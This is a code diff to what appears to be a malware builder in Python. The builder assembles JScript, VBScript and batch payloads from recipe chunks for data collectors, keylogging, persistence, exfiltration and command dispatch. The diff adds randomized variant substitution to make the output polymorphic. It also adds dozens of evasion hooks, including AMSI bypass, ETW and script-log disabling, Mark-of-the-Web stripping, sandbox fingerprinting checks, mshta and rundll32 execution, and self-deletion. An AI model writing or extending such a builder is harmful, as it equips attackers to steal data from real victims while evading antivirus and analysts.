@@ -41,21 +41,77 @@ def _load_variant_lookup() -> dict:
     return lookup
 
 
+def _load_chunk_to_group() -> dict:
+    """Returns {chunk_ref: group_name} for dedup in randomization."""
+    variants_path = CHUNKS_DIR / "variants.yaml"
+    if not variants_path.exists():
+        return {}
+    with open(variants_path) as f:
+        data = yaml.safe_load(f)
+    mapping = {}
+    for group_name, members in (data or {}).get("groups", {}).items():
+        for member in members:
+            mapping[member] = group_name
+    return mapping
+
+
 def _randomize_chunks(chunks: list[str], variant_lookup: dict,
                       rng: _random.Random) -> tuple[list[str], dict]:
     """Replace chunks with random variants from their group.
+    Deduplicates when a recipe lists multiple chunks from the same variant
+    group — only the first occurrence survives (randomized); the rest are
+    dropped to prevent redefinition errors.
     Returns (new_chunk_list, {original: chosen} for non-identity swaps)."""
+    chunk_to_group = _load_chunk_to_group()
     result = []
     subs = {}
+    seen_groups: dict[str, str] = {}  # group_name -> chosen replacement
     for chunk in chunks:
         if chunk in variant_lookup:
+            group = chunk_to_group.get(chunk)
+            if group and group in seen_groups:
+                subs[chunk] = seen_groups[group]
+                print(f"Variant dedup: dropped '{chunk}' (group '{group}' "
+                      f"already represented by '{seen_groups[group]}')",
+                      file=sys.stderr)
+                continue
             chosen = rng.choice(variant_lookup[chunk])
             result.append(chosen)
+            if group:
+                seen_groups[group] = chosen
             if chosen != chunk:
                 subs[chunk] = chosen
         else:
             result.append(chunk)
     return result, subs
+
+
+def _randomize_script_chunks(chunks: list[str], fmt: str,
+                             randomize: bool, seed: int | None) -> tuple[list[str], dict]:
+    """Randomize chunks for script formats (jscript/vbscript/batch).
+
+    Variant groups in variants.yaml use prefixed paths (e.g. jscript/evasion/anti_sandbox)
+    while recipes use bare paths (evasion/anti_sandbox). This function handles the
+    prefix/strip mapping so _randomize_chunks() can find matches.
+
+    Returns (randomized_chunks, {original_bare: chosen_bare} substitution map).
+    """
+    if not randomize:
+        return chunks, {}
+    variant_lookup = _load_variant_lookup()
+    if not variant_lookup:
+        return chunks, {}
+    rng = _random.Random(seed) if seed is not None else _random.Random()
+    fmt_dir = FORMAT_DIR[fmt]
+    prefixed = [f"{fmt_dir}/{c}" for c in chunks]
+    result, prefixed_subs = _randomize_chunks(prefixed, variant_lookup, rng)
+    bare_result = [c[len(fmt_dir) + 1:] if c.startswith(fmt_dir + "/") else c
+                   for c in result]
+    bare_subs = {k[len(fmt_dir) + 1:]: v[len(fmt_dir) + 1:]
+                 for k, v in prefixed_subs.items()}
+    if bare_subs:
+        print(f"Variant substitutions ({fmt}): {bare_subs}", file=sys.stderr)
+    return bare_result, bare_subs
 
 
 JS_FN_MAP = {
@@ -101,11 +157,49 @@ JS_EVASION_INIT_MAP = {
     "evasion/anti_sandbox": "if (check_sandbox()) WScript.Quit(0);",
     "evasion/anti_analysis": "if (check_analysis()) WScript.Quit(0);",
     "evasion/env_keying": "if (!check_environment()) WScript.Quit(0);",
+    "evasion/wmi_evasion": "if (check_sandbox()) WScript.Quit(0);",
     "evasion/deferred_exec": "deferred_wait();",
     "evasion/triggered_exec": "wait_for_user_activity();",
     "evasion/behavioral_pacing": "",
     "evasion/sleep_jitter": "",
     "evasion/string_obfusc": "",
+    "evasion/encoding_rotate": "",
+    "evasion/com_object_rotate": "",
+    "evasion/junk_code": "",
+    "evasion/amsi_bypass": "bypass_amsi();",
+    "evasion/split_join": "",
+    "evasion/reverse_decode": "",
+    "evasion/unicode_escape": "",
+    "evasion/math_charcode": "",
+    "evasion/screen_check": "check_screen();",
+    "evasion/uptime_check": "check_uptime();",
+    "evasion/usb_history": "check_usb();",
+    "evasion/installed_software": "check_software();",
+    "evasion/desktop_files": "check_desktop();",
+    "evasion/gpu_check": "check_gpu();",
+    "evasion/mouse_check": "check_mouse();",
+    "evasion/temp_density": "check_temp();",
+    "evasion/amsi_registry": "bypass_amsi();",
+    "evasion/amsi_clr_downgrade": "bypass_amsi();",
+    "evasion/amsi_string_frag": "bypass_amsi();",
+    "evasion/etw_disable": "disable_etw();",
+    "evasion/wsh_trace_disable": "disable_traces();",
+    "evasion/script_log_disable": "disable_scriptlog();",
+    "evasion/process_wmi": "",
+    "evasion/process_shell_app": "",
+    "evasion/process_shellwindows": "",
+    "evasion/process_schtask": "",
+    "evasion/http_object_rotate": "",
+    "evasion/user_agent_rotate": "",
+    "evasion/ads_exec": "",
+    "evasion/motw_strip": "strip_motw();",
+    "evasion/temp_dir_rotate": "",
+    "evasion/self_delete": "",
+    "evasion/triggered_wmi": "wait_for_activity();",
+    "evasion/conditional_time": "if (!check_time()) WScript.Quit(0);",
+    "evasion/self_reexec": "check_reexec();",
+    "evasion/lolbin_mshta": "",
+    "evasion/lolbin_rundll32": "",
 }
 
 VBS_FN_MAP = {
@@ -140,9 +234,41 @@ VBS_EVASION_INIT_MAP = {
     "evasion/anti_sandbox": "If check_sandbox() Then WScript.Quit 0",
     "evasion/anti_analysis": "If check_analysis() Then WScript.Quit 0",
     "evasion/env_keying": "If Not check_environment() Then WScript.Quit 0",
+    "evasion/wmi_evasion": "If check_sandbox() Then WScript.Quit 0",
     "evasion/deferred_exec": "Call deferred_wait()",
     "evasion/sleep_jitter": "",
     "evasion/string_obfusc": "",
+    "evasion/amsi_bypass": "Call bypass_amsi()",
+    "evasion/encoding_rotate": "",
+    "evasion/split_join": "",
+    "evasion/reverse_decode": "",
+    "evasion/screen_check": "Call check_screen()",
+    "evasion/uptime_check": "Call check_uptime()",
+    "evasion/usb_history": "Call check_usb()",
+    "evasion/installed_software": "Call check_software()",
+    "evasion/desktop_files": "Call check_desktop()",
+    "evasion/gpu_check": "Call check_gpu()",
+    "evasion/mouse_check": "Call check_mouse()",
+    "evasion/amsi_registry": "Call bypass_amsi()",
+    "evasion/amsi_clr_downgrade": "Call bypass_amsi()",
+    "evasion/etw_disable": "Call disable_etw()",
+    "evasion/wsh_trace_disable": "Call disable_traces()",
+    "evasion/script_log_disable": "Call disable_scriptlog()",
+    "evasion/process_wmi": "",
+    "evasion/process_shell_app": "",
+    "evasion/process_schtask": "",
+    "evasion/com_object_rotate": "",
+    "evasion/http_object_rotate": "",
+    "evasion/user_agent_rotate": "",
+    "evasion/ads_exec": "",
+    "evasion/motw_strip": "Call strip_motw()",
+    "evasion/temp_dir_rotate": "",
+    "evasion/self_delete": "",
+    "evasion/triggered_exec": "Call wait_for_activity()",
+    "evasion/behavioral_pacing": "",
+    "evasion/conditional_time": "If Not check_time() Then WScript.Quit 0",
+    "evasion/self_reexec": "Call check_reexec()",
+    "evasion/junk_code": "",
 }
 
 FN_MAP = {
@@ -331,7 +457,8 @@ def build_vbs_evasion_checks(evasion_chunks: list[str]) -> str:
     return "\n".join(lines)
 
 
-def assemble_vbscript(recipe_path: str, extra_vars: dict | None = None) -> str:
+def assemble_vbscript(recipe_path: str, extra_vars: dict | None = None,
+                      randomize: bool = False, seed: int | None = None) -> str:
     with open(recipe_path) as f:
         recipe = yaml.safe_load(f)
 
@@ -358,6 +485,8 @@ def assemble_vbscript(recipe_path: str, extra_vars: dict | None = None) -> str:
         else:
             all_chunks.append(persist)
     all_chunks.append(recipe["arch"])
+
+    all_chunks, substitutions = _randomize_script_chunks(all_chunks, "vbscript", randomize, seed)
 
     resolved = []
     resolved_set = set()
@@ -386,19 +515,19 @@ def assemble_vbscript(recipe_path: str, extra_vars: dict | None = None) -> str:
 
     source = "".join(bodies)
 
-    collectors = recipe.get("collectors", [])
+    collectors = [substitutions.get(c, c) for c in recipe.get("collectors", [])]
     source = source.replace("{{COLLECTOR_CALLS}}", build_vbs_collector_calls(collectors))
 
-    stage1 = recipe.get("stage1_collectors", [])
+    stage1 = [substitutions.get(c, c) for c in recipe.get("stage1_collectors", [])]
     source = source.replace("{{STAGE1_COLLECTORS}}", build_vbs_collector_calls(stage1))
 
-    stage2 = recipe.get("stage2_collectors", [])
+    stage2 = [substitutions.get(c, c) for c in recipe.get("stage2_collectors", [])]
     source = source.replace("{{STAGE2_COLLECTORS}}", build_vbs_collector_calls(stage2))
 
     all_collectors = collectors or (stage1 + stage2)
     source = source.replace("{{PACED_COLLECTOR_CALLS}}", build_vbs_paced_calls(all_collectors))
 
-    evasion_chunks = recipe.get("evasion", [])
+    evasion_chunks = [substitutions.get(e, e) for e in recipe.get("evasion", [])]
     source = source.replace("{{EVASION_CHECKS}}", build_vbs_evasion_checks(evasion_chunks))
 
     if recipe.get("exfil"):
@@ -428,7 +557,8 @@ def build_js_evasion_checks(evasion_chunks: list[str]) -> str:
     return "\n".join(lines)
 
 
-def assemble_jscript(recipe_path: str, extra_vars: dict | None = None) -> str:
+def assemble_jscript(recipe_path: str, extra_vars: dict | None = None,
+                     randomize: bool = False, seed: int | None = None) -> str:
     with open(recipe_path) as f:
         recipe = yaml.safe_load(f)
 
@@ -463,6 +593,8 @@ def assemble_jscript(recipe_path: str, extra_vars: dict | None = None) -> str:
             all_chunks.append(persist)
     all_chunks.append(recipe["arch"])
 
+    all_chunks, substitutions = _randomize_script_chunks(all_chunks, "jscript", randomize, seed)
+
     resolved = []
     resolved_set = set()
 
@@ -490,19 +622,19 @@ def assemble_jscript(recipe_path: str, extra_vars: dict | None = None) -> str:
 
     source = "".join(bodies)
 
-    collectors = recipe.get("collectors", [])
+    collectors = [substitutions.get(c, c) for c in recipe.get("collectors", [])]
     source = source.replace("{{COLLECTOR_CALLS}}", build_js_collector_calls(collectors))
 
     fn_list = ", ".join(JS_FN_MAP.get(c, c.split("/")[-1]) for c in collectors)
     source = source.replace("{{COLLECTOR_FUNCTIONS}}", fn_list)
 
-    stage1 = recipe.get("stage1_collectors", [])
+    stage1 = [substitutions.get(c, c) for c in recipe.get("stage1_collectors", [])]
     source = source.replace("{{STAGE1_COLLECTORS}}", build_js_collector_calls(stage1))
 
-    stage2 = recipe.get("stage2_collectors", [])
+    stage2 = [substitutions.get(c, c) for c in recipe.get("stage2_collectors", [])]
     source = source.replace("{{STAGE2_COLLECTORS}}", build_js_collector_calls(stage2))
 
-    evasion_chunks = recipe.get("evasion", [])
+    evasion_chunks = [substitutions.get(e, e) for e in recipe.get("evasion", [])]
     source = source.replace("{{EVASION_CHECKS}}", build_js_evasion_checks(evasion_chunks))
 
     if recipe.get("keylogger"):
@@ -519,7 +651,8 @@ def assemble_jscript(recipe_path: str, extra_vars: dict | None = None) -> str:
     return source
 
 
-def assemble_script(recipe_path: str, fmt: str, extra_vars: dict | None = None) -> str:
+def assemble_script(recipe_path: str, fmt: str, extra_vars: dict | None = None,
+                    randomize: bool = False, seed: int | None = None) -> str:
     """Generic assembler for VBScript and Batch formats."""
     with open(recipe_path) as f:
         recipe = yaml.safe_load(f)
@@ -546,6 +679,8 @@ def assemble_script(recipe_path: str, fmt: str, extra_vars: dict | None = None) 
             all_chunks.append(persist)
     all_chunks.extend(recipe.get("delivery", []))
     all_chunks.append(recipe["arch"])
+
+    all_chunks, substitutions = _randomize_script_chunks(all_chunks, fmt, randomize, seed)
 
     resolved = []
     resolved_set = set()
@@ -576,10 +711,10 @@ def assemble_script(recipe_path: str, fmt: str, extra_vars: dict | None = None) 
 
     source = "".join(bodies)
 
-    collectors = recipe.get("collectors", [])
-    stage1 = recipe.get("stage1_collectors", [])
-    stage2 = recipe.get("stage2_collectors", [])
-    evasion_chunks = recipe.get("evasion", [])
+    collectors = [substitutions.get(c, c) for c in recipe.get("collectors", [])]
+    stage1 = [substitutions.get(c, c) for c in recipe.get("stage1_collectors", [])]
+    stage2 = [substitutions.get(c, c) for c in recipe.get("stage2_collectors", [])]
+    evasion_chunks = [substitutions.get(e, e) for e in recipe.get("evasion", [])]
 
     if fmt == "vbscript":
         calls = "\n".join(f"    Call {c.split('/')[-1]}()" for c in collectors)
@@ -590,8 +725,9 @@ def assemble_script(recipe_path: str, fmt: str, extra_vars: dict | None = None) 
         source = source.replace("{{STAGE1_COLLECTORS}}", s1_calls)
         s2_calls = "\n".join(f"    Call {c.split('/')[-1]}()" for c in stage2)
         source = source.replace("{{STAGE2_COLLECTORS}}", s2_calls)
-        if recipe.get("exfil"):
-            source = source.replace("{{EXFIL_CALL}}", f"Call {recipe['exfil'].split('/')[-1]}()")
+        exfil_ref = substitutions.get(recipe.get("exfil", ""), recipe.get("exfil", ""))
+        if exfil_ref:
+            source = source.replace("{{EXFIL_CALL}}", f"Call {exfil_ref.split('/')[-1]}()")
     elif fmt == "batch":
         def _inline_bat(chunk_refs):
             blocks = []
@@ -918,11 +1054,11 @@ def assemble(recipe_path: str, extra_vars: dict | None = None,
 
     fmt = recipe.get("format", "c")
     if fmt == "jscript":
-        return assemble_jscript(recipe_path, extra_vars)
+        return assemble_jscript(recipe_path, extra_vars, randomize=randomize, seed=seed)
     if fmt == "vbscript":
-        return assemble_vbscript(recipe_path, extra_vars)
+        return assemble_vbscript(recipe_path, extra_vars, randomize=randomize, seed=seed)
     if fmt == "batch":
-        return assemble_script(recipe_path, fmt, extra_vars)
+        return assemble_script(recipe_path, fmt, extra_vars, randomize=randomize, seed=seed)
 
     rng = _random.Random(seed) if seed is not None else _random.Random()
     variant_lookup = _load_variant_lookup() if randomize else {}
@@ -1032,7 +1168,8 @@ def assemble(recipe_path: str, extra_vars: dict | None = None,
     source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))
 
     commands = recipe.get("commands", [])
-    source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(commands))
+    resolved_commands = [substitutions.get(c, c) for c in commands]
+    source = source.replace("{{COMMAND_DISPATCH}}", build_command_dispatch(resolved_commands))
 
     evasion_chunks = recipe.get("evasion", [])
     resolved_evasion = [substitutions.get(e, e) for e in evasion_chunks]
@@ -1049,8 +1186,9 @@ def assemble(recipe_path: str, extra_vars: dict | None = None,
     if persist_ref:
         prefs = [persist_ref] if isinstance(persist_ref, str) else persist_ref
         for p in prefs:
-            if p in PERSIST_INIT_MAP and PERSIST_INIT_MAP[p]:
-                evasion_init_lines.append(PERSIST_INIT_MAP[p])
+            resolved_p = substitutions.get(p, p)
+            if resolved_p in PERSIST_INIT_MAP and PERSIST_INIT_MAP[resolved_p]:
+                evasion_init_lines.append(PERSIST_INIT_MAP[resolved_p])
     source = source.replace("{{EVASION_INIT}}", "\n".join(evasion_init_lines) if evasion_init_lines else "")
 
     if recipe.get("api_resolve"):
@@ -1398,8 +1536,12 @@ def main():
             k, val = v.split("=", 1)
             extra_vars[k] = val
 
-    source = assemble(args.recipe, extra_vars,
-                      randomize=args.randomize, seed=args.seed)
+    try:
+        source = assemble(args.recipe, extra_vars,
+                          randomize=args.randomize, seed=args.seed)
+    except FileNotFoundError as e:
+        print(f"ERROR: {e}", file=sys.stderr)
+        sys.exit(1)
 
     with open(args.recipe) as rf:
         recipe_data = yaml.safe_load(rf)
